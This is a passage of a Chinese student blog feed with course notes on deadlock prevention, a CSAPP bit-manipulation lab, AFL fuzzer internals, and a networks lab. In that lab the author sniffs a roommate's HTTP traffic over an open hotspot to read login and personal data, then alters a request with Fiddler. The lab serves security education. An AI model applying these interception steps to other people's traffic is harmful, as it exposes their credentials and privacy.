pthread_mutex_unlock(&amp;proc_info_lock);<br></code></pre></td></tr></table></figure><p>为<code>proc_info</code>的访问加锁</p><h3 id="违反顺序"><a href="#违反顺序" class="headerlink" title="违反顺序"></a>违反顺序</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-number">1</span> Thread <span class="hljs-number">1</span>::<br><span class="hljs-number">2</span> <span class="hljs-type">void</span> <span class="hljs-title function_">init</span><span class="hljs-params">()</span> &#123;<br><span class="hljs-number">3</span> ...<br><span class="hljs-number">4</span> mThread = PR_CreateThread(mMain, ...);<br><span class="hljs-number">5</span> ...<br><span class="hljs-number">6</span> &#125;<br><span class="hljs-number">7</span><br><span class="hljs-number">8</span> Thread <span class="hljs-number">2</span>::<br><span class="hljs-number">9</span> <span class="hljs-type">void</span> <span class="hljs-title function_">mMain</span><span class="hljs-params">(...)</span> &#123;<br><span class="hljs-number">10</span> ...<br><span class="hljs-number">11</span> mState = mThread-&gt;State;<br><span class="hljs-number">12</span> ...<br><span class="hljs-number">13</span> &#125; <br></code></pre></td></tr></table></figure><p>线程 2 的代码中似乎假定变量 mThread 已经被初始化了（不为空）。 然而，如果线程 1 并没有首先执行，线程 2 就可能因为引用空指针奔溃</p><p>修复：<strong>使用条件变量</strong></p><p><strong>强制顺序</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-number">1</span> <span class="hljs-type">pthread_mutex_t</span> mtLock = PTHREAD_MUTEX_INITIALIZER;<br><span class="hljs-number">2</span> <span class="hljs-type">pthread_cond_t</span> mtCond = PTHREAD_COND_INITIALIZER;<br><span class="hljs-number">3</span> <span class="hljs-type">int</span> mtInit = <span class="hljs-number">0</span>;<br><span class="hljs-number">4</span><br><span class="hljs-number">5</span> Thread <span class="hljs-number">1</span>::<br><span class="hljs-number">6</span> <span class="hljs-type">void</span> <span class="hljs-title function_">init</span><span class="hljs-params">()</span> &#123;<br><span class="hljs-number">7</span> ...<br><span class="hljs-number">8</span> mThread = PR_CreateThread(mMain, ...);<br><span class="hljs-number">9</span><br><span class="hljs-number">10</span> <span class="hljs-comment">// signal that the thread has been created...</span><br><span class="hljs-number">11</span> pthread_mutex_lock(&amp;mtLock);<br><span class="hljs-number">12</span> mtInit = <span class="hljs-number">1</span>;<br><span class="hljs-number">13</span> pthread_cond_signal(&amp;mtCond);<br><span class="hljs-number">14</span> pthread_mutex_unlock(&amp;mtLock);<br><span class="hljs-number">15</span> ...<br><span class="hljs-number">16</span> &#125;<br><span class="hljs-number">17</span><br><span class="hljs-number">18</span> Thread <span class="hljs-number">2</span>::<br><span class="hljs-number">19</span> <span class="hljs-type">void</span> <span class="hljs-title function_">mMain</span><span class="hljs-params">(...)</span> &#123;<br><span class="hljs-number">20</span> ...<br><span class="hljs-number">21</span> <span class="hljs-comment">// wait for the thread to be initialized...</span><br><span class="hljs-number">22</span> pthread_mutex_lock(&amp;mtLock);<br><span class="hljs-number">23</span> <span class="hljs-keyword">while</span> (mtInit == <span class="hljs-number">0</span>)<br><span class="hljs-number">24</span> pthread_cond_wait(&amp;mtCond, &amp;mtLock);<br><span class="hljs-number">25</span> pthread_mutex_unlock(&amp;mtLock);<br><span class="hljs-number">26</span><br><span class="hljs-number">27</span> mState = mThread-&gt;State;<br><span class="hljs-number">28</span> ...<br><span class="hljs-number">29</span> &#125;<br></code></pre></td></tr></table></figure><p>只要<code>myInit</code>变量为0时，main就不继续进行，而是等待其初始化完成。</p><h2 id="死锁"><a href="#死锁" class="headerlink" title="死锁"></a>死锁</h2><p>产生死锁的四个条件：</p><ul><li>互斥：线程对于需要的资源进行互斥的访问（例如一个线程抢到锁）。</li><li>持有并等待：线程持有了资源（例如已将持有的锁），同时又在等待其他资源（例如，需要获得的锁）。</li><li>非抢占：线程获得的资源（例如锁），不能被抢占。</li><li>循环等待：线程之间存在一个环路，环路上每个线程都额外持有一个资源，而这个资源又是下一个线程要申请的。</li></ul><p>四个条件全部满足，才会产生死锁。</p><h3 id="预防"><a href="#预防" class="headerlink" title="预防"></a>预防</h3><p><strong>循环等待</strong></p><p>也许最实用的预防技术（当然也是经常采用的），就是让代码不会产生循环等待。最直接的方法就是获取锁时提供一个<strong>全序（total ordering）</strong>。假如系统共有两个锁（L1 和 L2）， 那么我们每次都<strong>先</strong>申请 L1 然<strong>后</strong>申请 L2，就可以避免死锁。这样严格的顺序避免了循环等待， 也就不会产生死锁。</p><p>当然，更复杂的系统中不会只有两个锁，锁的全序可能很难做到。因此，<strong>偏序（partial ordering）</strong>可能是一种有用的方法，安排锁的获取并避免死锁。Linux 中的内存映射代码就 是一个偏序锁的好例子[T+94]。代码开头的注释表明了 10 组不同的加锁顺序，包括简单的 关系，比如 i_mutex 早于 i_mmap_mutex，也包括复杂的关系，比如 i_mmap_mutex 早于 private_lock，早于 swap_lock，早于 mapping-&gt;tree_lock。</p><p><strong>持有并等待</strong></p><p>原子地抢锁</p><p>先抢一个全局锁</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-number">1</span> lock(prevention);<br><span class="hljs-number">2</span> lock(L1);<br><span class="hljs-number">3</span> lock(L2);<br><span class="hljs-number">4</span> ...<br><span class="hljs-number">5</span> unlock(prevention); <br></code></pre></td></tr></table></figure><p>先抢到 prevention 这个锁之后，代码保证了在抢锁的过程中，不会有不合时宜的线程切换，从而避免了死锁。</p><p><strong>非抢占</strong></p><p>在调用 unlock 之前，都认为锁是被占有的，多个抢锁操作通常会带来麻烦，因为我们 等待一个锁时，同时持有另一个锁。很多线程库提供更为灵活的接口来避免这种情况。具 体来说，**trylock()**函数会尝试获得锁，或者返回−1，表示锁已经被占有。你可以稍后重试 一下。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-number">1</span> top:<br><span class="hljs-number">2</span>  lock(L1);<br><span class="hljs-number">3</span>  <span class="hljs-keyword">if</span> (trylock(L2) == <span class="hljs-number">-1</span>) &#123;<br><span class="hljs-number">4</span>   unlock(L1);<br><span class="hljs-number">5</span>   <span class="hljs-keyword">goto</span> top;<br><span class="hljs-number">6</span> &#125;<br></code></pre></td></tr></table></figure><p>注意，另一个线程可以使用相同的加锁方式，但是不同的加锁顺序（L2 然后 L1），程 序仍然不会产生死锁。但是会引来一个新的问题：<strong>活锁（livelock）</strong>。</p><p>两个线程有可能一直重复这一序列，又同时都抢锁失败。这种情况下，系统一直在运行这段代码（因此不是死 锁），但是又不会有进展，因此名为活锁。也有活锁的解决方法：例如，可以在循环结束的时候，先随机等待一个时间，然后再重复整个动作，这样可以降低线程之间的重复互相干扰。</p><p><strong>互斥</strong></p><p>最后的预防方法是完全避免互斥。通常来说，代码都会存在临界区，因此很难避免互斥。那么我们应该怎么做呢？</p><p>Herlihy 提出了设计各种<strong>无等待（wait-free）</strong>数据结构的思想。</p><p>想法很简单：通过强大的硬件指令，我们可以构造出不需要锁的数据结构。</p><p><strong>通过调度避免死锁</strong></p><p>除了死锁预防，某些场景更适合<strong>死锁避免（avoidance）</strong>。</p><p>例如，假设我们需要在两个处理器上调度 4 个线程。更进一步，假设我们知道线程 1 （T1）需要用锁 L1 和 L2，T2 也需要抢 L1 和 L2，T3 只需要 L2，T4 不需要锁。我们用表 32.2 来表示线程对锁的需求。</p><p>一种比较聪明的调度方式是，只要 T1 和 T2 不同时运行，就不会产生死锁。</p><p><img src="/2023/03/23/Operating-Systems/p23.png"></p><p><strong>检查和恢复</strong></p><p>最后一种常用的策略就是允许死锁偶尔发生，检查到死锁时再采取行动。举个例子， 如果一个操作系统一年死机一次，你会重启系统，然后愉快地（或者生气地）继续工作。</p><p>如果死锁很少见，这种不是办法的办法也是很实用的。</p><p><strong>Not everything worth doing is worth doing well</strong></p>]]></content>
    
    
    
    <tags>
      
      <tag>course</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>计算机网络实验一</title>
    <link href="/2023/03/22/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%AE%9E%E9%AA%8C%E4%B8%80/"/>
    <url>/2023/03/22/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%AE%9E%E9%AA%8C%E4%B8%80/</url>
    
    <content type="html"><![CDATA[<h1 id="计网实验一Wireshark抓包、改包等"><a href="#计网实验一Wireshark抓包、改包等" class="headerlink" title="计网实验一Wireshark抓包、改包等"></a>计网实验一Wireshark抓包、改包等</h1><h2 id="实验内容一："><a href="#实验内容一：" class="headerlink" title="实验内容一："></a>实验内容一：</h2><h3 id="实验要求："><a href="#实验要求：" class="headerlink" title="实验要求："></a>实验要求：</h3><p>使用wireshark在教学楼，咖啡店（或其他提供顾客Wi-Fi的营业性公共场所），寝室三类地点静默观察能听到的数据包，观察wireshark对它的分层解析，尽可能多的描述你看到了什么，以及这三类地方数据包的不同。如果只给你一段wireshark的数据包记录，例如pcap文件，你能区分它是从哪里采集的吗？可行性如何，难点主要在哪里。</p><h3 id="实验内容："><a href="#实验内容：" class="headerlink" title="实验内容："></a>实验内容：</h3><p>1.在教学楼、咖啡店、寝室静默观察数据包</p><p>1.1 教学楼观察到的数据包</p><p><img src="/2023/03/22/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%AE%9E%E9%AA%8C%E4%B8%80/p1.png"></p><p><img src="/2023/03/22/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%AE%9E%E9%AA%8C%E4%B8%80/p2.png"></p><p>可以看到，绝大多数为 ARP 协议的数据包，其余少量的数据包分别是 NBNS , MDNS , DHCP 等数据包。<br>ARP数据包：ARP（Address Resolution Protocol）地址解析协议，根据IP地址获取物理地址的一个TCP/IP协议。</p><p>由于OSI模型把网络分为七层，IP地址在OSI模型第三层，MAC地址在第二层，彼此不直接通信。在通过以太网发送IP数据包时，需要封装第三层（32位IP地址）和第二层（48位MAC地址）的报头，由于发送数据包时，只知道目标IP地址，不知道其MAC地址，而又不能跨越第二、三层，所有需要使用地址解析协议。</p><p>ARP 的报文格式：</p><p><img src="/2023/03/22/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%AE%9E%E9%AA%8C%E4%B8%80/p3.png"></p><ul><li><p>字段1：ARP请求的目的以太网地址，全1时，代表广播地址。</p></li><li><p>字段2：发送ARP请求的以太网地址。</p></li><li><p>字段3：以太网帧类型表示后面的数据类型，ARP请求和ARP应答此字段为：0x0806。</p></li><li><p>字段4：硬件地址类型，硬件地址不止以太网一种，是以太网类型时，值为1。</p></li><li><p>字段5：表示要映射的协议地址的类型，要对IPv4地址进行映射，此值为0x0800。</p></li><li><p>字段6和7：表示硬件地址长度和协议地址长度，MAC地址占6字节，IP地址占4字节。</p></li><li><p>字段8：是操作类型字段，值为1，表示进行ARP请求；值为2，表示进行ARP应答；值为3，表示进行RARP请求；值为4，表示进行RARP应答。</p></li><li><p>字段9：是发送端ARP请求或应答的硬件地址，这里是以太网地址，和字段2相同。</p></li><li><p>字段10：是发送ARP请求或应答的IP地址。</p></li><li><p>字段11和12：是目的端的硬件地址和IP地址。</p></li></ul><p>对抓到的 ARP 数据包进行分析：</p><p><img src="/2023/03/22/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%AE%9E%E9%AA%8C%E4%B8%80/p4.png"><br>Frame 9: 56 bytes on wire </p><p>指的是这是第9帧数据包的详细信息，这个包大小为56字节。</p><p>Ethernet II , Src : Tp-LinkT_a1:f4:64 , Dst : Broadcast</p><p>以上内容表示以太网帧头部信息，源地址是Src后的内容，目的地址是全1，即为广播，因为主机PC2不知道PC1主机的MAC地址，这样，局域网内所有设备都会收到该数据包。</p><p>Address Resolution Protocol(request)</p><p>以上内容表示地址解析协议的内容，request 表示该包是一个请求包。在该包中，包含有ARP更详细的字段信息，如下所示：</p><ul><li><p>Address Resolution Protocol (request)   #ARP请求包 </p></li><li><p>Hardware type: Ethernet (1)   #硬件类型 </p></li><li><p>Protocol type: IP (0x0800)   #协议类型 </p></li><li><p>Hardware size: 6   #硬件地址 </p></li><li><p>Protocol size: 4  #协议长度 </p></li><li><p>Opcode: request (1)   #操作码。该值为1表示是个ARP请求包 </p></li><li><p>Sender MAC address: 02:00:04:78:01:7b (02:00:04:78:01:7b)   #发送端MAC地址 </p></li><li><p>Sender IP address: 10.1.1.142 (10.1.1.142)   #发送端IP地址 </p></li><li><p>Target MAC address: 00:00:00_00:00:00 (00:00:00:00:00:00)   #目标MAC地址 </p></li><li><p>Target IP address: 10.1.1.166(10.1.1.166)   #目标IP地址 </p></li></ul><p>纵观所有抓到的包，其最大不同在于source的不同，有的是HuaweiTe_09:e8:48，有的是Tp-LinkT_13:68:28等等，这些不同的源应该是不同的同学的host。由于广播的原因，我可以捕获这些包。</p><p>1.2寝室观察到的数据包</p><p>由于教室、寝室，均连接校园网，预测结果基本一致</p><p>抓包结果：</p><p><img src="/2023/03/22/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%AE%9E%E9%AA%8C%E4%B8%80/p5.png"></p><p>观察其内容可知，寝室内校园网抓包结果与教室内一致。</p><p>1.3咖啡厅观察到的数据包</p><p>首先，确认我的IP地址</p><p><img src="/2023/03/22/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%AE%9E%E9%AA%8C%E4%B8%80/p6.png"></p><p>收听一段时间后，如图：</p><p><img src="/2023/03/22/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%AE%9E%E9%AA%8C%E4%B8%80/p7.png"></p><p>其中有一段TCP握手过程：</p><p><img src="/2023/03/22/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%AE%9E%E9%AA%8C%E4%B8%80/p8.png"></p><p>查询该ip地址，35.244.128.0 发现是与谷歌云进行链接。</p><p>找到其他握手过程，分别查询ip<br>分别为：网易云，某香港ip，亚马逊云，等等。</p><p>再观察其HTTP协议包：</p><p><img src="/2023/03/22/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%AE%9E%E9%AA%8C%E4%B8%80/p9.png"><br>追踪之：<br><img src="/2023/03/22/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%AE%9E%E9%AA%8C%E4%B8%80/p10.png"><br>可以发现这是一个图片的发送。</p><p>2.这三种数据的不同：</p><p>很显然，咖啡馆的数据包与另外两个相比，信息量更大，有很多TCP协议的握手等过程，以及一部分HTTP协议传输的数据。而链接校园网的寝室与教室，基本上只能接收到一些ARP包，没什么用处。</p><p>3.分辨pcap文件来源</p><p>目前，分辨有内网隔离的校园网来源的pcap与公开wifi的咖啡厅来源的pcap是比较容易的<br>但其他情况，就不能轻易下结论了。</p><h2 id="实验内容二："><a href="#实验内容二：" class="headerlink" title="实验内容二："></a>实验内容二：</h2><h3 id="实验要求：-1"><a href="#实验要求：-1" class="headerlink" title="实验要求："></a>实验要求：</h3><p>打开你的手机热点，不设置密码，用wireshark观察舍友通过你的手机上HTTP网站，登录学校门户，打开淘宝购物等过程，描述你能看到什么，不能看到什么。讲讲你作为信息安全专业人士，想到了什么？如果这台手机可以被你操控，比如对舍友的信息流注入点什么，那么你又能想到些什么呢？</p><h3 id="实验内容：-1"><a href="#实验内容：-1" class="headerlink" title="实验内容："></a>实验内容：</h3><p>开启热点进行抓包后，有一个HTTP包引起了注意：<br><img src="/2023/03/22/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%AE%9E%E9%AA%8C%E4%B8%80/p11.png"></p><p>可以看到，从这个包内，我能轻松地找到登录时传入的用户名以及经过某种算法计算后的密码值。</p><p>由于HTTP明文传输，我也可以从对校内个人门户的访问过程中读到相关个人信息如下：</p><p><img src="/2023/03/22/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%AE%9E%E9%AA%8C%E4%B8%80/p12.jpg" alt="&quot;名字被暴露了&quot;"></p><p>以及学院、学号等信息</p><p><img src="/2023/03/22/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%AE%9E%E9%AA%8C%E4%B8%80/p13.jpg"></p><p>还有我访问的页面–校园网流量使用情况中的数据：已使用 88.11G均可见</p><p><img src="/2023/03/22/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%AE%9E%E9%AA%8C%E4%B8%80/p14.png"></p><p>可以看出，如果HTTP使用者不做任何加密措施（非协议层次的），通过HTTP协议传输的所有信息，都将完全可见可读，毫无隐私可言，对于敏感信息，更是危及信息安全。</p><p>如果我能操纵这个手机</p><p>可以进行改包，用fiddler软件进行包拦截，再将其中的数据修改，最后发送出去。</p><p>例如：</p><p>我搜索马云：</p><p><img src="/2023/03/22/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%AE%9E%E9%AA%8C%E4%B8%80/p15.png"></p><p>利用fiddler 拦截、改包为马化腾后</p><p><img src="/2023/03/22/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%AE%9E%E9%AA%8C%E4%B8%80/p16.png"></p><p><img src="/2023/03/22/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%AE%9E%E9%AA%8C%E4%B8%80/p17.png"></p><p>发现我的搜索变成了马化腾。</p><p>当我能控制这个手机时同理，可以操纵相当一部分的数据流。（需要配置好一些参数，例如主机、端口号8888等，故真实场景内，利用其窃听较为容易，控制很难！）</p><p><strong>以上就是本次实验的全部内容</strong></p><h2 id="总结与心得"><a href="#总结与心得" class="headerlink" title="总结与心得"></a>总结与心得</h2><ul><li>通过这次实验，学会了用 wireshark 进行抓包分析，了解了 ARP HTTP TCP 等协议的执行流程，以及其包的结构。</li><li>通过查阅资料，学会了通过 QQ 电话来查询好友的 IP （无需接通，具体实现请移步个人博客 kawatsuki.com ），以及抓包、拦截、改包等一系列操作，深刻感受到，计算机网络我是可以参与的，过程性参与的。</li><li>最后，我认为信息安全事业任重道远，网络上很多数据都是透明的，通过 WIFI 抓包等手段，可以很容易地获取之，我们都是透明地无隐私地生活在这个网络社会上！</li></ul>]]></content>
    
    
    
    <tags>
      
      <tag>course</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Contact me</title>
    <link href="/2023/03/21/Contact-me/"/>
    <url>/2023/03/21/Contact-me/</url>
    
    <content type="html"><![CDATA[<h1 id="联系方式"><a href="#联系方式" class="headerlink" title="联系方式"></a>联系方式</h1><p>联系方式</p><p>email：<a href="mailto:&#x6b;&#x61;&#119;&#x61;&#x30;&#50;&#55;&#115;&#x75;&#107;&#105;&#x40;&#103;&#109;&#97;&#x69;&#108;&#46;&#x63;&#x6f;&#x6d;">&#x6b;&#x61;&#119;&#x61;&#x30;&#50;&#55;&#115;&#x75;&#107;&#105;&#x40;&#103;&#109;&#97;&#x69;&#108;&#46;&#x63;&#x6f;&#x6d;</a>  /  <a href="mailto:&#102;&#99;&#x32;&#x73;&#x74;&#x75;&#100;&#x79;&#x40;&#104;&#x6e;&#117;&#x2e;&#101;&#100;&#117;&#46;&#x63;&#110;">&#102;&#99;&#x32;&#x73;&#x74;&#x75;&#100;&#x79;&#x40;&#104;&#x6e;&#117;&#x2e;&#101;&#100;&#117;&#46;&#x63;&#110;</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>schedule</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>datalab</title>
    <link href="/2023/03/21/datalab/"/>
    <url>/2023/03/21/datalab/</url>
    
    <content type="html"><![CDATA[<h1 id="计算机系统实验二-Datalab-实验报告"><a href="#计算机系统实验二-Datalab-实验报告" class="headerlink" title="计算机系统实验二 Datalab 实验报告"></a>计算机系统实验二 Datalab 实验报告</h1><h1 id="1-实验目的："><a href="#1-实验目的：" class="headerlink" title="1.实验目的："></a>1.实验目的：</h1><ul><li>补充完整 bits.c 文件内容，完成实验；</li><li>了解机器中对整型、浮点数的存储方式；</li><li>熟悉位操作，完成一系列指令。</li></ul><h1 id="2-实验准备"><a href="#2-实验准备" class="headerlink" title="2.实验准备"></a>2.实验准备</h1><ul><li>学习 CSAPP 书上的相关信息表示部分；</li><li>配置好虚拟机环境。</li></ul><h1 id="3-实验任务"><a href="#3-实验任务" class="headerlink" title="3.实验任务"></a>3.实验任务</h1><ul><li>补充完整 bits.c 文件内容，并利用 btest 程序进行测试。</li></ul><p>1.bitAnd </p><p>要求： 输出两个数按位与操作后的值。<br>实现：参数 x，y 分别按位取反后，进行或操作，最后再将结果取反即可（数学推导而成）</p><p>代码截图：<br><img src="/2023/03/21/datalab/p1.png"></p><p>2.getByte</p><p>要求：将整型数据 x 的第 n 个字节取出。<br>实现：直接将 x 右移 n*8 个位后，与 0xFF 进行与操作，取出最后一个字节即可。</p><p>代码截图：<br><img src="/2023/03/21/datalab/p2.png"></p><p>3.logicalShift</p><p>要求：实现逻辑右移，由于 &gt;&gt; 为算术右移，需要实现负数的逻辑右移。<br>实现：将 x 算术右移 n 位后，与 <code>~(1 &lt;&lt; 31) &gt;&gt; n) &lt;&lt; 1)</code>进行与操作，这样可以使负数算术右移后，前面的一串 1 改为 0 ，达到逻辑右移的目的。</p><p>代码截图：<br><img src="/2023/03/21/datalab/p3.png"></p><p>4.bitCount</p><p>要求：计算出x中有多少个1。<br>实现：计算出每两位中1的个数，用对应的两位进行存储，随后计算每四位中，再计算每8位，最后可得到结果。</p><p>代码截图：<br><img src="/2023/03/21/datalab/p4.png"></p><p>5.bang</p><p>要求：不使用逻辑取反的情况下实现逻辑取反。<br>实现：用x或其负数，再右移31位取符号位+1即可。利用了x取反后，符号位均为1，除x == 0外的特性。</p><p>代码截图：<br><img src="/2023/03/21/datalab/p5.png"></p><p>6.tmin</p><p>要求：输出最小的二进制补码。<br>实现：最小的二进制补码是0x80000000。</p><p>代码截图：<br><img src="/2023/03/21/datalab/p6.png"></p><p>7.fitsBits</p><p>要求：给出一个数，判断x 是否能最少被 n 位表示。<br>实现：对于正数，若 x 右移 n -1 位（这一个是符号位，不可缺少），剩余的都是0，即可，对于负数，剩余的应该都是1。</p><p>代码截图：<br><img src="/2023/03/21/datalab/p7.png"></p><p>8.divpwr2</p><p>要求：输出x除以2的n次幂后，向0取整的结果。<br>实现：正数直接右移n位即可，负数需进行调整。</p><p>代码截图：<br><img src="/2023/03/21/datalab/p8.png"></p><p>9.negate</p><p>要求：实现取反。<br>实现：直接按位取反+1（取补码）即可。</p><p>代码截图：<br><img src="/2023/03/21/datalab/p9.png"></p><p>10.isPositive</p><p>要求：判断 x 是否大于0；<br>实现：对 x == 0 单独讨论即可</p><p>代码截图：<br><img src="/2023/03/21/datalab/p10.png"></p><p>11.isLessOrEqual</p><p>要求：判断x是否小于等于y<br>实现：用y-x，判断符号位即可。</p><p>代码截图:<br><img src="/2023/03/21/datalab/p11.png"></p><p>12.ilog2</p><p>要求：求xlog2的值<br>实现：在这个实现中，我们首先将结果初始化为0。然后，我们使用位运算符逐步将结果设置为x的二进制表示中最高位1的位置。具体来说，我们首先检查x的高16位是否有1，如果有，则将结果的高4位设置为4。然后，我们将x右移结果的值，以便在下一步中检查剩余的位。我们重复这个过程，直到我们检查了x的所有位。最后，我们返回结果。</p><p>代码截图：<br><img src="/2023/03/21/datalab/p12.png"></p><p>13.float_neg</p><p>要求：浮点数取反<br>实现：先将NaN直接返回无需操作，其余数据修改符号位即可。</p><p>代码截图：<br><img src="/2023/03/21/datalab/p13.png"></p><p>14.float_i2f</p><p>要求：将int转换为float<br>实现：首先使用0x80000000获取x的符号位，如果x的符号位上是1，则求其补码。这一过程通过if判断实现。之后，通过while循环寻找除符号位外最高位1的位置，由于0x0和0x80000000去除符号位后对循环跳出条件有影响（会陷入死循环），故作为特殊边界值取出，单独做返回值。找到最高位1的位置后加上偏置量即可得到阶码的数值，再通过移位操作即可转移到指定的地方。对x进行左移操作，使32位中仅保留尾数相关的信息。取前23位作为尾数基础部分，后9位作为判断舍入的依据。若后9位不处于中间值则按照“大于进位，小于保留原状态”的方式处理。若处于中间值，则看23位的最后一位，如果它是1则选择“进位+1”，如果它是0则选择“保持原状态”。最后，整合各部分结果即可得到题目要求的结果。</p><p>代码截图：<br><img src="/2023/03/21/datalab/p14.png"></p><p>15.float_twice</p><p>要求：浮点数乘二<br>实现：对于非规格化值，需要将尾数左移一位，若进位，阶码需+1。对于规格化值，阶码+1。特殊值直接返回本身就行。</p><p>代码截图：<br><img src="/2023/03/21/datalab/p15.png"></p><h2 id="检查是否违规："><a href="#检查是否违规：" class="headerlink" title="检查是否违规："></a>检查是否违规：</h2><p>dlc检查：<br><img src="/2023/03/21/datalab/p16.png"></p><p>btest检查：<br><img src="/2023/03/21/datalab/p17.png"></p><p>关于btest有一个项目没过关：是环境问题，0肯定可以用32位表示的。</p><h1 id="4-实验总结："><a href="#4-实验总结：" class="headerlink" title="4.实验总结："></a>4.实验总结：</h1><h2 id="实验中出现的问题："><a href="#实验中出现的问题：" class="headerlink" title="实验中出现的问题："></a>实验中出现的问题：</h2><ul><li>环境的差异性，导致有一个样例未能通过，但代码是没问题的。</li><li>虚拟机的不稳定性，虚拟机总是死机。</li></ul><h2 id="实验心得"><a href="#实验心得" class="headerlink" title="实验心得"></a>实验心得</h2><ul><li>操作位是一个十分有意思的事情，利用有限的操作达成一个目的。</li><li>体会到更底层方面，仅用加法、位移这类操作实现计算机的艰难与智慧。</li></ul>]]></content>
    
    
    
    <tags>
      
      <tag>course</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>xfuzz</title>
    <link href="/2023/03/19/xfuzz/"/>
    <url>/2023/03/19/xfuzz/</url>
    
    <content type="html"><![CDATA[<p>cc_params传参调用execv</p><figure class="highlight sqf"><table><tr><td class="gutter"><div class="code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></div></td><td class="code"><pre><code class="hljs sqf">cc_params[cc_par_cnt++] = <span class="hljs-string">&quot;-D__AFL_LOOP(_A)=&quot;</span><br>    <span class="hljs-string">&quot;(&#123; static volatile char *_B __attribute__((used)); &quot;</span><br>    <span class="hljs-string">&quot; _B = (char*)\&quot;&quot; PERSIST_SIG &quot;</span>\<span class="hljs-string">&quot;; &quot;</span><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> __APPLE__</span><br>    <span class="hljs-string">&quot;__attribute__((visibility(\&quot;</span><span class="hljs-keyword">default</span>\<span class="hljs-string">&quot;))) &quot;</span><br>    <span class="hljs-string">&quot;int _L(unsigned int) __asm__(\&quot;</span><span class="hljs-variable">___afl_persistent_loop</span>\<span class="hljs-string">&quot;); &quot;</span><br><span class="hljs-meta">#<span class="hljs-keyword">else</span></span><br>    <span class="hljs-string">&quot;__attribute__((visibility(\&quot;</span><span class="hljs-keyword">default</span>\<span class="hljs-string">&quot;))) &quot;</span><br>    <span class="hljs-string">&quot;int _L(unsigned int) __asm__(\&quot;</span><span class="hljs-variable">__afl_persistent_loop</span>\<span class="hljs-string">&quot;); &quot;</span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span> <span class="hljs-comment">/* ^__APPLE__ */</span></span><br>    <span class="hljs-string">&quot;_L(_A); &#125;)&quot;</span>;<br><br></code></pre></td></tr></table></figure><p>编译器 -D 选项，编译时拓展宏定义</p><p>读完 persistent mode 运行流程</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span 